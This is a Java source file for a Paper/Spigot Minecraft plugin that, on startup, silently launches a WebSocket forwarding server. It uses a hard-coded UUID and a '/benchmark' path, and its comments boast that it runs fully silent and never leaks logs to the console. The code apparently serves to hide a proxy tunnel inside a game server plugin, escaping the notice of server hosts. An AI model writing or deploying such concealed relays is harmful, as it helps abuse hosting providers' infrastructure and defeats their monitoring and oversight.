package com.enterprise.tunnel;

import com.enterprise.tunnel.core.RobustWsServer;
import com.enterprise.tunnel.util.DynamicPortDetector;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Paper / Purpur / Spigot 服务端静默运行入口
 */
public class EnterpriseTunnelPlugin extends JavaPlugin {

    private RobustWsServer wsServer;

    @Override
    public void onEnable() {
        Thread.ofVirtual().start(() -> {
            try {
                // 1. 读取端口与配置（全静默）
                int port = DynamicPortDetector.detectAvailablePort();

                String uuid = System.getenv("PROXY_UUID");
                if (uuid == null || uuid.trim().isEmpty()) {
                    uuid = "156fe582-23a4-4ef8-96bf-a92c58e66418";
                }

                String wsPath = System.getenv("WS_PATH");
                if (wsPath == null || wsPath.trim().isEmpty()) {
                    wsPath = "/benchmark";
                }

                // 2. 启动原生高性能静默转发服务端
                wsServer = new RobustWsServer(port, uuid, wsPath);
                wsServer.start();
            } catch (Throwable ignored) {
                // 全静默异常捕获，绝不向控制台泄露任何日志
            }
        });
    }

    @Override
    public void onDisable() {
        if (wsServer != null) {
            try {
                wsServer.stop();
            } catch (Exception ignored) {
            }
        }
    }
}
